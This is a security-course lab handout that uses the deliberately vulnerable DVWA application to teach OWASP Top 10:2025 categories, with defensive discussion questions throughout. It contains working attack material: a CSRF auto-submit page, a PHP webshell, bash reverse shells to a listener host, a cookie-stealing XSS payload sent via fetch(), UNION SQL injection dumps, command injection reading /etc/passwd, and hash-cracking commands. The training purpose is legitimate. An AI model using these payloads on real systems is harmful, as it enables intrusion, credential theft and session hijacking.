# Lab 5: Web Exploitation with DVWA
### OWASP Top 10:2025 — A01 through A05

## VM
Once the VM is up & running, log in with the following credentials:
==> default:        http://localhost:8080/login.php
==> default:        Username : admin
==> default:        Password : password

---

## Th3 D4y 5amy B3c4m3 Every0ne's H3r0

It's **October 4, 2005**. An 19-year-old kid named **Samy Kamkar** sits at his computer
staring at MySpace — the dominant social network of the era, 60 million users strong.
He wants more friends. Not the normal way. His way.

Samy notices that MySpace lets users customize their profiles with HTML — but strips out
`<script>` tags for "security." Most people stop there. Samy doesn't. He pokes at the
filters, finds that MySpace allows CSS `style` attributes, and discovers that Internet
Explorer will happily execute JavaScript hidden inside a `style` property. He crafts a
payload so carefully obfuscated it doesn't look like JavaScript at all. Then he embeds
it in his own profile.

The payload does three things silently when any logged-in user visits his page: it adds
Samy as their friend, it copies itself onto *their* profile, and it appends the message
**"but most of all, samy is my hero"** to their About Me section. Every infected profile
becomes a new infection vector.

He posts the profile at **11:00 PM**. By **1:00 AM** he has thousands of new friends.
By morning, **one million MySpace accounts** are compromised. The site goes down.
MySpace engineers spend the weekend manually hot-patching the database. The United States
Secret Service shows up at Samy's door.

One developer. One browser. One unvalidated input field. One million victims in under
**20 hours** — still the fastest-spreading virus in internet history.

In this lab, **you will build Samy's attack from scratch** — and four others just like
it. Welcome to web security.

---

## Sp34k1ng 1337 — A Crash Course in Leet

Before we dive in, there is one more piece of hacker culture you need: **Leet** (also
written **1337**, pronounced "elite"). It originated in the 1980s on bulletin board
systems (BBS) where early hackers substituted letters with visually similar numbers and
symbols to evade keyword filters, signal in-group membership, and — let's be honest —
look cool. It spread through IRC, warez groups, and early online gaming, and it lives on
today in usernames, CTF challenges, and flag formats everywhere.

### The Leet Alphabet

| Letter | Leet | Letter | Leet |
|--------|------|--------|------|
| A | `4` or `@` | N | `|\|` |
| B | `8` | O | `0` |
| C | `(` | P | `|°` |
| E | `3` | R | `|2` |
| F | `|=` | S | `5` or `$` |
| G | `9` or `6` | T | `7` |
| H | `|-|` | U | `|_|` |
| I | `1` or `!` | V | `\/` |
| K | `|<` | W | `\/\/` |
| L | `1` or `|_` | X | `><` |
| M | `|\/|` | Z | `2` |

### Common Hacker Vocabulary

| Leet | Plain English | Meaning |
|------|---------------|---------|
| `1337` | leet / elite | skilled hacker |
| `h4x0r` | haxor | hacker |
| `n00b` | noob | beginner |
| `r00t` | root | system administrator / full control |
| `0wn3d` / `pwn3d` | owned / pwned | fully compromised |
| `sk1llz` | skills | hacking abilities |
| `3xpl01t` | exploit | attack code |
| `w0rm` | worm | self-replicating malware (like Samy's) |
| `d3f4c3` | deface | vandalize a website |
| `sc r1pt k1dd13` | script kiddie | someone who runs tools without understanding them |

> **Your goal this semester**: graduate from `n00b` to `1337 h4x0r`.
> The difference is not the tools — it is understanding *why* they work.

---

> **Ethics Notice:** All activities in this lab target a VM you control in an isolated
> environment. Applying these techniques against any system without explicit written
> authorization is **illegal**. Understanding how attacks work is the foundation of
> building effective defenses. Think Purple Team — attack to defend.

---

## Overview

You will exploit five critical web vulnerability classes using the **Damn Vulnerable Web
Application (DVWA)**, mapped to the **OWASP Top 10:2025** (released February 2025).
Each exercise walks you through a real attack technique using CLI tools, then asks you
to reason about defenses.

| # | OWASP 2025 Category | DVWA Module(s) | Primary Tool(s) |
|---|---|---|---|
| 1 | A01 — Broken Access Control | CSRF | `curl`, browser, `python3` |
| 2 | A02 — Security Misconfiguration | File Upload | `curl`, `netcat` |
| 3 | A03 — Software Supply Chain Failures | *(infrastructure)* | `nikto`, `searchsploit`, `whatweb` |
| 4 | A04 — Cryptographic Failures | Weak Session IDs | `john`, browser DevTools |
| 5 | A05 — Injection | SQLi · XSS · Command Injection | `sqlmap`, `curl`, `netcat` |

---

## Learning Objectives

By the end of this lab you will be able to:

- Forge cross-site requests that hijack authenticated user actions (CSRF)
- Upload a PHP webshell and execute OS commands via HTTP
- Fingerprint a web stack and map its components to known CVEs
- Identify and exploit predictable session tokens and cracked password hashes
- Exploit SQL Injection, XSS, and OS Command Injection with real attack tooling
- Articulate a concrete remediation for each vulnerability class

---

## Prerequisites

- Lab 5 VM running (`vagrant up` inside `vm_labs/lab5/`)
- Security level set to **Low** (DVWA Security tab in the left menu)
- Tools available on your host (install if missing):

```bash
sudo apt install nikto whatweb exploitdb hydra sqlmap john curl netcat-openbsd
```

> **Note:** `whatweb` and `searchsploit` (from the `exploitdb` package) are
> pre-installed on ParrotOS. On Ubuntu install `exploitdb` from the Kali repos or
> clone from https://github.com/offensive-security/exploitdb.

---

## VM Network Reference
*** Change the IP adresses according to your environment. ***

| Endpoint | Address |
|---|---|
| DVWA (host browser) | `http://localhost:8080` |
| DVWA (scanning tools) | `http://192.168.56.50` |
| Your host (attacker listeners) | `192.168.56.1` |

---

---

## Exercise 1 — A01:2025 Broken Access Control

### CSRF: Forging Unauthorized State Changes

**Background**

Broken Access Control is ranked **#1** in OWASP 2025 and was found in 100% of
applications tested. Cross-Site Request Forgery (CSRF) is a canonical BAC attack: a
malicious page tricks an authenticated user's browser into sending a privileged request
to a target application. Because the browser automatically attaches session cookies, the
server cannot distinguish the forged request from a legitimate one — the attack silently
inherits the victim's identity and permissions.

**Objective:** Craft an HTML page that changes the DVWA admin password without the
victim ever seeing a form.

---

### Step 1 — Understand the legitimate request

Log in to DVWA, navigate to **DVWA Security → Low**, then inspect what a real
password-change request looks like:

```bash
# Grab a fresh session cookie
curl -s -c /tmp/dvwa.jar \
  -d "username=admin&password=password&Login=Login" \
  -L http://localhost:8080/login.php > /dev/null

SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')
echo "Session: $SESSION"

# Send a legitimate password change and observe the request
curl -v -b "PHPSESSID=$SESSION;security=low" \
  "http://localhost:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change" \
  2>&1 | grep -E "^(> GET|< HTTP|Location)"
```

Note the request structure: it is a plain `GET` with parameters in the query string —
no secret token required. That is the flaw.

---

### Step 2 — Craft the attack page

```bash
cat > /tmp/evil.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Claim Your Prize!</title></head>
<body>
  <h1>You have been selected for a free security audit!</h1>
  <p>Loading your results...</p>

  <!-- Hidden form that auto-submits on page load -->
  <form id="pwn"
        action="http://localhost:8080/vulnerabilities/csrf/"
        method="GET"
        style="display:none;">
    <input type="hidden" name="password_new"  value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change"        value="Change">
  </form>

  <script>window.onload = () => document.getElementById('pwn').submit();</script>
</body>
</html>
EOF

# Serve the malicious page from your host
python3 -m http.server 9000 --directory /tmp/
```

---

### Step 3 — Simulate the victim

1. Keep the DVWA admin session active in your browser (do **not** log out)
2. Open a **new tab** and navigate to `http://localhost:9000/evil.html`
3. The page loads and auto-submits — observe the redirect

---

### Step 4 — Verify the attack succeeded

```bash
# Attempt login with the new password
curl -s -c /tmp/post_csrf.jar \
  -d "username=admin&password=hacked123&Login=Login" \
  -L http://localhost:8080/login.php | grep -i "logout\|welcome\|index.php"
```

A successful output will contain a reference to the authenticated dashboard.
Reset back to `password` before continuing.

---

### Deliverables

- [ ] The contents of your `evil.html` payload
- [ ] `curl` output confirming login with `hacked123`

### Discussion Questions

1. What is a **CSRF token** and why does embedding one in the form break this attack?
2. The `SameSite=Strict` cookie attribute prevents CSRF. Explain *why* — what does it
   instruct the browser to do differently?
3. Why does HTTPS **not** protect against CSRF?

---
---

## Exercise 2 — A02:2025 Security Misconfiguration

### Unrestricted File Upload → Remote Code Execution

**Background**

Security Misconfiguration covers missing hardening across the application stack:
unnecessary features left on, absent input validation, verbose error messages that
expose internals, and unchanged default credentials. DVWA's file upload endpoint has
zero content validation at Low security — any file type is accepted and stored in a
web-accessible directory. Uploading a PHP file gives us **Remote Code Execution** on
the server.

**Objective:** Upload a PHP webshell, execute OS commands over HTTP, then catch a
reverse shell.

---

### Step 1 — Observe the misconfiguration: verbose error messages

Before touching File Upload, visit the SQL Injection module and trigger a database error:

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

curl -s -b "PHPSESSID=$SESSION;security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=1'&Submit=Submit" | grep -i "error\|mysql\|warning"
```

The raw MySQL error message reveals the database version and query structure — a textbook
A02 misconfiguration (error handling that leaks implementation details to the client).

---

### Step 2 — Create the PHP webshell

```bash
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
EOF
```

---

### Step 3 — Upload the shell

1. Navigate to **DVWA → File Upload**
2. Use the upload form to select `/tmp/shell.php`
3. Note the confirmation message — DVWA tells you the exact path where it was saved

Alternatively, upload via `curl`:

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

curl -s -b "PHPSESSID=$SESSION;security=low" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@/tmp/shell.php;type=application/x-php" \
  -F "Upload=Upload" \
  "http://localhost:8080/vulnerabilities/upload/" | grep -i "succesfully\|path\|hackable"
```

---

### Step 4 — Execute OS commands via HTTP

```bash
BASE="http://localhost:8080/hackable/uploads/shell.php"
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

# Who is the web process running as?
curl -s -b "PHPSESSID=$SESSION;security=low" "$BASE?cmd=id"

# Read the OS release
curl -s -b "PHPSESSID=$SESSION;security=low" "$BASE?cmd=uname+-a"

# Steal the DVWA database credentials
curl -s -b "PHPSESSID=$SESSION;security=low" \
  "$BASE?cmd=cat+/var/www/html/dvwa/config/config.inc.php"

# Map the network interfaces (useful for pivoting)
curl -s -b "PHPSESSID=$SESSION;security=low" "$BASE?cmd=ip+addr"
```

---

### Step 5 — Catch a reverse shell

```bash
# Terminal 1 — listener on your host
nc -lvnp 4444

# Terminal 2 — trigger the reverse shell via the webshell
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')
curl -s -b "PHPSESSID=$SESSION;security=low" \
  "http://localhost:8080/hackable/uploads/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'"
```

Your listener should receive an interactive shell as `www-data`.

---

### Deliverables

- [ ] `curl` output showing `id` and `uname -a` from the webshell
- [ ] Output of `cat config.inc.php` showing the DB credentials
- [ ] Screenshot or terminal output of the reverse shell prompt

### Discussion Questions

1. List three server-side controls that would individually block this attack.
2. Why should uploaded files **never** be stored inside the web root? Where should
   they go instead?
3. The default credentials `admin`/`password` are also A02. What organizational
   process ensures defaults are changed before a system goes live?

---
---

## Exercise 3 — A03:2025 Software Supply Chain Failures

### Component Fingerprinting and CVE Discovery

**Background**

A03 is the **newest entrant** in OWASP 2025. Unlike the other categories, it targets
the *platform* beneath the application — outdated or compromised third-party libraries,
frameworks, and server software. Real-world examples include Log4Shell
(CVE-2021-44228), SolarWinds, and the 2025 Bybit supply chain attack. An attacker who
cannot break the application logic often pivots to attacking the infrastructure it
runs on.

DVWA has no dedicated module for this — instead, we treat the **VM itself** as the
target and walk through an attacker's recon workflow: fingerprint → version identify →
CVE search → assess risk.

**Objective:** Identify the exact software stack running on the DVWA VM and map it to
known CVEs.

---

### Step 1 — Passive fingerprinting: response headers

```bash
# HTTP response headers often reveal server identity
curl -sI http://192.168.56.50 | grep -iE "server|x-powered-by|x-generator"
```

Note the `Server:` and `X-Powered-By:` values. These alone reveal Apache and PHP
versions to any passive observer.

---

### Step 2 — Active fingerprinting with WhatWeb

```bash
whatweb -a 3 http://192.168.56.50
```

`-a 3` sets aggression level to "aggressive" — WhatWeb will make additional requests to
identify plugins, CMS version, and JavaScript libraries. Record every component and
version it identifies.

---

### Step 3 — Vulnerability scan with Nikto

```bash
nikto -h http://192.168.56.50 -o /tmp/nikto_dvwa.txt -Format txt
cat /tmp/nikto_dvwa.txt
```

Nikto cross-references its findings against a database of thousands of known
misconfigurations and CVEs. Pay attention to:

- `OSVDB-` and `CVE-` references in the output
- Outdated software warnings
- Dangerous HTTP methods enabled (e.g., `PUT`, `DELETE`)
- Missing security headers

---

### Step 4 — Exact version audit inside the VM

```bash
# Query installed package versions directly from the VM
vagrant ssh -c "dpkg -l apache2 php* mysql-server 2>/dev/null | grep '^ii' | awk '{print \$2, \$3}'"

# Check for available security updates
vagrant ssh -c "sudo apt list --upgradable 2>/dev/null | grep -i 'security\|php\|apache\|mysql'"
```

---

### Step 5 — Search for CVEs with searchsploit

Using the versions identified above:

```bash
# Search by component — adjust version numbers to match your output
searchsploit apache 2.4
searchsploit php 8.3
searchsploit mysql 8.0

# Pipe to grep for RCE and critical findings
searchsploit apache 2.4 | grep -i "remote\|rce\|exec"
```

---

### Step 6 — Assess a historical supply chain CVE (research task)

Look up **CVE-2021-44228** (Log4Shell) and answer the discussion questions below.
This is the most impactful supply chain vulnerability of the past decade.

```bash
searchsploit log4shell
searchsploit log4j
```

---

### Deliverables

- [ ] Table of identified components and versions (from WhatWeb / Nikto / dpkg)
- [ ] At least **two** CVE or OSVDB references from the Nikto output, with a one-line
      explanation of each finding
- [ ] Answer the discussion questions below

### Discussion Questions

1. An attacker cannot exploit DVWA's login page but finds the PHP version is outdated.
   Describe the attack path from that information to potential RCE.
2. What is a **Software Bill of Materials (SBOM)** and how does it help an organization
   respond faster when a new CVE like Log4Shell drops?
3. The `Server: Apache/2.4.XX` header gives free reconnaissance to attackers. Should
   you suppress it? What is the trade-off?

---
---

## Exercise 4 — A04:2025 Cryptographic Failures

### Predictable Session Tokens and Cracked Password Hashes

**Background**

A04 covers two failure modes: **weak cryptography at rest** (e.g., unsalted MD5
password hashes) and **weak randomness in transit** (e.g., predictable session
identifiers). Both are present in DVWA. A session token that can be predicted is
functionally equivalent to no authentication at all — an attacker can forge valid
sessions without ever knowing the password.

**Objective:** Decode DVWA's predictable session tokens, then crack the MD5 password
hashes extracted in Exercise 5.

---

### Part A — Weak Session IDs

#### Step 1 — Generate tokens and observe the pattern

1. Navigate to **DVWA → Weak Session IDs**
2. Open **Browser DevTools → Application → Cookies** (or use the Storage Inspector)
3. Click **"Generate"** five times, recording the `dvwaSession` cookie value each time

Then decode each token:

```bash
# DVWA at Low security uses a simple incrementing integer encoded as... nothing.
# Inspect the raw values:
for val in 1 2 3 4 5; do
  echo -n "Token $val raw: $val"
  echo " | hex: $(printf '%d' $val | xxd -p)"
  echo " | base64 attempt: $(echo -n $val | base64)"
done
```

#### Step 2 — Predict the next valid session

Once you identify the pattern (sequential integer, timestamp, etc.), calculate what
the next token should be and forge it:

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

# Replace PREDICTED_VALUE with the next token in the sequence
curl -s -b "PHPSESSID=$SESSION;security=low;dvwaSession=PREDICTED_VALUE" \
  "http://localhost:8080/vulnerabilities/weak_id/" | grep -i "session\|cookie\|value"
```

#### Step 3 — Contrast with a cryptographically secure token

```bash
# What a real session token should look like: 256 bits of CSPRNG output
python3 -c "import secrets; print(secrets.token_hex(32))"

# Compare entropy:
# DVWA token: log2(max_integer) ≈ a few bits
# Secure token: log2(2^256) = 256 bits
```

---

### Part B — MD5 Hash Cracking

You will extract and crack the DVWA user hashes. If you have not completed Exercise 5
yet, run the following first to dump them:

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

curl -s -b "PHPSESSID=$SESSION;security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit" \
  | grep -oP '(?<=First name: ).*?(?=<)'
```

#### Step 1 — Save the hashes

```bash
cat > /tmp/dvwa_hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
5f4dcc3b5aa765d61d8327deb882cf99
EOF
```

#### Step 2 — Crack with John the Ripper

```bash
# Using the rockyou wordlist (standard on ParrotOS / Kali)
john /tmp/dvwa_hashes.txt \
  --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john /tmp/dvwa_hashes.txt --format=raw-md5 --show
```

#### Step 3 — Demonstrate why salting matters

```bash
# Without a salt, identical passwords produce identical hashes
echo -n "password" | md5sum   # 5f4dcc3b5aa765d61d8327deb882cf99 — always

# With bcrypt (what you should use):
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()))"
# Every run produces a different hash — rainbow tables are useless
```

---

### Deliverables

- [ ] Table: the 5 `dvwaSession` values you recorded and the pattern you identified
- [ ] Predicted next token value + the `curl` command you used to test it
- [ ] Output of `john --show` with all cracked passwords

### Discussion Questions

1. What makes MD5 a broken choice for password storage? Name two specific weaknesses.
2. Explain the difference between **hashing**, **encryption**, and **salting** in the
   context of password storage.
3. If a session token is based on the current Unix timestamp (`time()`), how many
   guesses would an attacker need to brute-force a valid session? Show your reasoning.

---
---

## Exercise 5 — A05:2025 Injection

### SQL Injection · Stored XSS · Command Injection

**Background**

Injection dropped from A03 (2021) to A05 in 2025, but it remains the most technically
rich category — SQL Injection has 14,000+ CVEs, XSS over 30,000. All three injection
types present in DVWA target different interpreters: the **database** (SQLi), the
**victim's browser** (XSS), and the **OS shell** (command injection). Mastering these
three gives you a mental model that generalizes to LDAP injection, template injection,
NoSQL injection, and beyond.

---

### Part A — SQL Injection

**DVWA Module:** SQL Injection

#### Step 1 — Confirm the injection point

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')
BASE="http://localhost:8080/vulnerabilities/sqli/?Submit=Submit"

# Normal input
curl -s -b "PHPSESSID=$SESSION;security=low" "$BASE&id=1" | grep "First name"

# Break the query — look for a MySQL error (this is also an A02 finding)
curl -s -b "PHPSESSID=$SESSION;security=low" "$BASE&id=1'" | grep -i "error\|mysql"
```

#### Step 2 — Enumerate columns with ORDER BY

```bash
for i in 1 2 3; do
  echo -n "ORDER BY $i: "
  curl -s -b "PHPSESSID=$SESSION;security=low" \
    "$BASE&id=1'+ORDER+BY+$i--+" | grep -ic "error"
done
# When you get an error, you have one more column than the last working value
```

#### Step 3 — UNION-based data extraction

```bash
# Extract database name and current user
curl -s -b "PHPSESSID=$SESSION;security=low" \
  "$BASE&id=1'+UNION+SELECT+user(),database()--+" \
  | grep "First name\|Surname"

# List all tables in the current DB
curl -s -b "PHPSESSID=$SESSION;security=low" \
  "$BASE&id=1'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+" \
  | grep "First name"

# Dump the users table
curl -s -b "PHPSESSID=$SESSION;security=low" \
  "$BASE&id=1'+UNION+SELECT+user,password+FROM+users--+" \
  | grep "First name\|Surname"
```

#### Step 4 — Automate with sqlmap

```bash
sqlmap \
  -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}');security=low" \
  -D dvwa -T users --dump \
  --batch --level=1 --risk=1
```

---

### Part B — Stored XSS

**DVWA Module:** XSS (Stored)

Stored XSS is more dangerous than Reflected XSS because the payload persists in the
database and executes for **every user** who visits the page — no phishing link needed.

#### Step 1 — Baseline: confirm the field is vulnerable

1. Navigate to **DVWA → XSS (Stored)**
2. Name: `test`, Message: `<script>alert(document.domain)</script>`
3. Submit — the alert fires immediately and again on every page load

#### Step 2 — Cookie theft with a netcat listener

Open a second terminal on your host:

```bash
# Terminal 1: start listener
nc -lvnp 8888
```

Inject the cookie-stealing payload (your host's private IP is `192.168.56.1`):

```bash
# Name field (max 10 chars shown in UI — bypass with curl)
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

curl -s -b "PHPSESSID=$SESSION;security=low" \
  -d "txtName=hacker" \
  --data-urlencode "mtxMessage=<script>fetch('http://192.168.56.1:8888/?c='+document.cookie)</script>" \
  -d "btnSign=Sign+Guestbook" \
  "http://localhost:8080/vulnerabilities/xss_s/"
```

Now reload the guestbook page in your browser. Your netcat listener should receive:

```
GET /?c=PHPSESSID=<session_id>;security=low HTTP/1.1
```

That is a live session token you could use to hijack the admin account.

#### Step 3 — Session hijack using the stolen cookie

```bash
# Use the stolen cookie to authenticate as the victim without a password
STOLEN_SESSION="<paste stolen PHPSESSID here>"

curl -s -b "PHPSESSID=$STOLEN_SESSION;security=low" \
  "http://localhost:8080/index.php" | grep -i "welcome\|logout"
```

---

### Part C — Command Injection

**DVWA Module:** Command Injection

#### Step 1 — Understand the application function

The DVWA Command Injection module runs a server-side `ping` on whatever IP you submit.

```bash
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

# Legitimate use
curl -s -b "PHPSESSID=$SESSION;security=low" \
  -d "ip=127.0.0.1&Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/" | grep -A5 "results\|pre"
```

#### Step 2 — Inject OS commands

In bash, `;` chains commands regardless of the previous exit code:

```bash
# Chain whoami after the ping
curl -s -b "PHPSESSID=$SESSION;security=low" \
  --data-urlencode "ip=127.0.0.1; whoami" \
  -d "Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/" | grep -A10 "<pre>"

# Read /etc/passwd
curl -s -b "PHPSESSID=$SESSION;security=low" \
  --data-urlencode "ip=127.0.0.1; cat /etc/passwd" \
  -d "Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/" | grep -A50 "<pre>"

# Full system recon in one shot
curl -s -b "PHPSESSID=$SESSION;security=low" \
  --data-urlencode "ip=127.0.0.1; id; hostname; uname -a; ip addr" \
  -d "Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/" | grep -A30 "<pre>"
```

#### Step 3 — Reverse shell via command injection

```bash
# Terminal 1: listener
nc -lvnp 5555

# Terminal 2: trigger reverse shell through the injection
SESSION=$(grep PHPSESSID /tmp/dvwa.jar | awk '{print $7}')

curl -s -b "PHPSESSID=$SESSION;security=low" \
  --data-urlencode "ip=127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.56.1/5555 0>&1'" \
  -d "Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/"
```

---

### Deliverables

- [ ] `curl` output showing the UNION-based SQLi dump of the `users` table
- [ ] `sqlmap` terminal output with cracked credentials
- [ ] Netcat output showing the stolen session cookie (from Stored XSS)
- [ ] `curl` output showing `id; hostname; uname -a` via command injection
- [ ] (Bonus) Screenshot of an interactive reverse shell prompt

### Discussion Questions

1. What is the difference between a **Reflected** and a **Stored** XSS? Which is
   harder to detect and why?
2. A developer argues: *"We validate the IP field with a regex on the client side,
   so command injection is impossible."* Why is this wrong?
3. Prepared statements (parameterized queries) prevent SQL injection. Write a
   pseudocode example showing the difference between a vulnerable query and a
   safe one.

---
---

## Submission Requirements

Submit a **single PDF report** containing:

### 1. OWASP 2025 Mapping Table

Fill in the following for each exercise:

| Exercise | DVWA Module | OWASP 2025 | CVSS Rating* | Remediation (1 sentence) |
|---|---|---|---|---|
| 1 | CSRF | A01 — Broken Access Control | | |
| 2 | File Upload | A02 — Security Misconfiguration | | |
| 3 | Infrastructure | A03 — Supply Chain Failures | | |
| 4 | Weak Session IDs | A04 — Cryptographic Failures | | |
| 5a | SQL Injection | A05 — Injection | | |
| 5b | Stored XSS | A05 — Injection | | |
| 5c | Command Injection | A05 — Injection | | |

*Use the [CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1) to estimate
severity for at least one finding.*

### 2. Exercise Evidence

For each exercise, include:
- Terminal output or screenshots proving successful exploitation
- Answers to all Discussion Questions

### 3. Executive Summary (1 paragraph)

Imagine you are presenting to a non-technical CTO. What is the overall security posture
of this application? What is the single most critical risk and why?

### 4. Reflection (1 paragraph)

What surprised you most in this lab? If you were brought in as a consultant to remediate
this application, what are the **first three controls** you would implement and in what
order?

---

## Tools Reference

| Tool | Purpose | Install |
|---|---|---|
| `sqlmap` | Automated SQL injection | `sudo apt install sqlmap` |
| `john` | Password hash cracking | `sudo apt install john` |
| `nikto` | Web vulnerability scanner | `sudo apt install nikto` |
| `whatweb` | Web stack fingerprinting | `sudo apt install whatweb` |
| `searchsploit` | CVE/exploit search | `sudo apt install exploitdb` |
| `hydra` | Credential brute-forcing | `sudo apt install hydra` |
| `curl` | HTTP requests from CLI | pre-installed |
| `nc` (netcat) | Reverse shell / listeners | `sudo apt install netcat-openbsd` |
| `python3 -m http.server` | Serve attacker payloads | pre-installed |
| Burp Suite CE | HTTP proxy / interceptor | https://portswigger.net/burp |

---

## References

- [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free labs
  aligned with every topic in this assignment
- [CVE-2021-44228 — Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
